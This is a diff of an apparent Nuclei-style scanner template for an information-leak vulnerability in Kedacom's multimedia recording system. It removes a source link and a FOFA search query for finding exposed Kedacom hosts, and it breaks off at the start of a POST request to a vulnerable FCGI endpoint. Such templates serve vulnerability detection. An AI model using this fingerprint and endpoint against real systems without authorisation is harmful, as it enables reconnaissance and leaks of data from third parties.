@@ -3,12 +3,8 @@ info:
   name: 苏州科达科技股份有限公司多媒体录播系统存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gf74uyhtgqf7k04e'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gf74uyhtgqf7k04e
-    fofa: body="kedaname" || body="KEDACOM" || body="www.kedacom.com" || body="科达多媒体录播系统"
 http:
 - raw:
   - 'POST /fcgi-bin/vrswebinterpreter.fcgi HTTP/1.1
